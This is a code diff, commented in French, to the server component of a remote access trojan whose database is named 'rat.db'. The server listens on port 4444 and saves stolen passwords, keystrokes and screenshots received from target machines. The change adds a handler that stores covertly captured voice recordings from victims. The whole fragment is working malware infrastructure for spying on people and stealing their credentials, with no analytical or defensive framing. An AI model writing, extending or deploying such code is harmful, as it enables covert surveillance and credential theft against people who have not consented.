@@ -18,6 +18,10 @@ SERVER_PORT = 4444
 DB_PATH = "../bdd/rat.db"
 KEYLOG_DIR = "keylogs"
 CAPTURE_DIR = "captures"
+VOICE_DIR = "voice"
+
+for directory in [KEYLOG_DIR, CAPTURE_DIR, VOICE_DIR]:
+    os.makedirs(directory, exist_ok=True)
 
 
 REMOTE_PORT = 5555
@@ -72,9 +76,9 @@ clients = {}
 def save_to_db(file_type, client_ip, data, file_path=None):
     """Sauvegarde des données dans la base de données."""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    if file_type == "keystroke":
-        cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", (timestamp, client_ip, data))
-    elif file_type == "passwords":
+    # if file_type == "keystroke":
+    #     cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", (timestamp, client_ip, data))
+    if file_type == "passwords":
         for pwd in data:
             cursor.execute("INSERT INTO passwords (target_ip, timestamp, url, username, password) VALUES (?, ?, ?, ?, ?)",
                            (client_ip, timestamp, pwd['url'], pwd['username'], pwd['password']))
@@ -111,7 +115,14 @@ def process_data(data, client_ip):
             file_path = os.path.join(screenshot_dir, filename)
             with open(file_path, "wb") as f:
                 f.write(bytes.fromhex(file_data))
-            print(f"[+] Screenshot sauvegardé dans : {file_path}")       
+            print(f"[+] Screenshot sauvegardé dans : {file_path}")
+
+        elif file_type == "voice":
+            file_path = os.path.join(VOICE_DIR, filename)
+            with open(file_path, "wb") as f:
+                f.write(bytes.fromhex(file_data))
+            print(f"[+] Fichier audio sauvegardé : {file_path}")
+
 
         print(f"[+] Données '{file_type}' reçues et sauvegardées de {client_ip}")
 
